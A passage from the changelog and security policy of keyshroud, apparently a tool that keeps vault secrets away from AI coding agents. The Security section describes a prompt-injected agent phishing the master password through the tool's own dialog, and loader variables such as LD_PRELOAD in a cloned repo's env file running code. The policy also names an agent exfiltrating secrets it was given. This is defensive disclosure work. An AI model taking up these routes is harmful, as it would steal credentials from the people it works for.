  runs `bw lock` then, so a copied session token stops working too. It follows the
  clock, so time a laptop spends asleep counts. Without `setup`, keyshroud shares
  bw's default login, so this also ends a `bw` session you opened yourself.
- `setup` no longer stores the agent account's master password unless you pass
  `--confirm-unlock`; from an agent's shell the generated password goes to the
  clipboard only, and `setup --registered` asks for it in a dialog.

### Added
- `unlock --unattended` and `setup --unattended` for hosts nobody sits at: they
  always ask in a terminal (never in a dialog an agent could open), then open a
  session without an end. A wrong password leaves the running session alone. Unlike a master-password file,
  a leaked session cannot log in elsewhere or change the password.
- `doctor` reports where the master password is stored, if anywhere, and when the
  session ends.
- Windows support (tested on Windows 10, Node 22): `bw`, `npm` and other npm CLIs
  installed as `.cmd` shims run without a shell (other `.cmd`/`.bat` files through
  `cmd.exe`), the unlock and secret dialogs are a PowerShell window, the lock timer is
  a detached Node process, `secrets_run` uses `cmd.exe`, and the clipboard and signup
  page work. Over `ssh -t`, Windows ends the timer with the SSH session; that session
  then ends on the next call. System tools (`powershell`, `clip`, `taskkill`,
  `explorer`) run by absolute path, and a command that is not on `PATH` fails
  instead of running a file of that name from the current directory.
- `doctor` warns when `bw` 2026.9 or later talks to a self-hosted server: those
  releases cannot log in to Vaultwarden yet (`KeyIdBackfillError`, vaultwarden#7750).

### Fixed
- `add` and `rotate` still refuse the master password as a secret when it is not
  stored: keyshroud keeps a scrypt hash of a typed master password for that check,
  and tries the value against the vault when that file is missing or altered.
- A command waiting for another command's unlock dialog asks again when that
  dialog closes without unlocking, instead of waiting five minutes.
- Running `setup` again on a logged-in agent account keeps the open session.
- `run` and `secrets_run` mask a `~/.config/keyshroud/master-password` file that a
  command prints.
- `setup` works on a host whose keyring is locked (SSH): it no longer needs the
  keychain.
- A wrong master password says so instead of printing bw's decryption errors.

## [0.5.3] - 2026-10-15

### Security
Fixes from an independent audit and a multi-model review of 0.5.2.
- The native dialog could be used by a prompt-injected agent to phish new
  secrets, including the vault master password. It now says a program asked for
  it and warns against the master password, refuses multi-line, control or bidi
  characters and names over 120 characters, refuses a value equal to the master
  password, opens one at a time with a 30 s pause after a cancel, and is audited.
  zenity runs with `--no-markup`.
- Env files could set `PATH`, `NODE_OPTIONS`, `LD_PRELOAD` and other loader
  variables, so a cloned repo's `.env.refs` could run code. They are rejected
  in env files, refused by `add`/`wire`/`secrets_request`, and never injected.
- Streaming redaction leaked most of a secret longer than 4096 characters.
- `secrets_run` could return a partial secret when output hit the collection
  limit; the cut tail is now dropped before masking, with per-stream budgets.
- `import` missed `*_PASS`, URL passwords with no username, hex keys, and known
  key formats in names containing `PUBLIC`; `.env.refs` is now written `0600`.
- `inject -o` replaces a planted symlink instead of writing through it; temp
  files use random names and exclusive creation.

### Changed
- `add`/`rotate` read stdin only with `--stdin`; a multi-line paste into the
  `*` prompt is drained and refused instead of reaching the shell.
- `secrets_request` checks names and existing items before opening the dialog,
  reports auth.json conflicts instead of claiming success, and returns errors.
- Item names with leading or trailing spaces are refused (they shadowed
  existing items). `add`, `rotate` and `secrets_request` refresh the redact
  index and write to the audit log.

# Security policy

## Reporting a vulnerability

Please **do not open a public issue**. Use GitHub's private vulnerability
reporting: *Security → Report a vulnerability* on
[dinhkarate/keyshroud](https://github.com/dinhkarate/keyshroud/security/advisories/new).

Include the version (`keyshroud --version`), OS, agent (Claude Code, pi, omp,
MCP client) and a minimal reproduction. Never include real secret values; use
obviously fake ones.

We aim to acknowledge reports within 3 days and to ship a fix or mitigation for
confirmed issues within 14 days, crediting reporters who want credit.

## Supported versions

Only the latest minor release receives security fixes while the project is
pre-1.0.

## Scope

In scope: any path where a secret value reaches argv, logs, diagnostics, tool or
MCP results, hook output, the audit log, files with permissions wider than
`0600`, or the model's context despite redaction being enabled; auth.json
corruption; session token exposure; a local vault that opens with the wrong key,
accepts a changed file, loses an update, or whose key or passphrase leaves the OS
key store or the user's terminal.

Note on `redact-index.json`: it holds a keyed HMAC and a 32-bit rolling hash of
each value so hooks can redact without plaintext. Anyone who can read this
`0600` file can brute-force weak values offline — the same trust boundary as the
`bw` session file next to it, which unlocks the whole vault, and as the local
vault's key in the OS keychain.

Touch ID vaults (macOS, `KEYSHROUD_VAULT_KEY=secure-enclave`): in scope is any way to open one while no
session is open without the person at the Mac approving a sheet, any key material from the helper
(`src/touchid.swift`) reaching argv, logs or errors, and a rekey or rm that changes the vault without
the approval it asks for. Out of scope: a process already running as the user that shows its own Touch
ID sheet, rewrites keyshroud, its cached helper or tools on PATH to capture the next approval, or reads
`vault.session` + `vault.token` during a session (Touch ID proves presence, not intent).

Out of scope (documented limitations, see the README's *Security model*): an
agent deliberately exfiltrating a value it was given (for example over the
network, or after encoding it); secrets shorter than 6 characters; values the
user prints with `get` or `env --shell` on purpose.
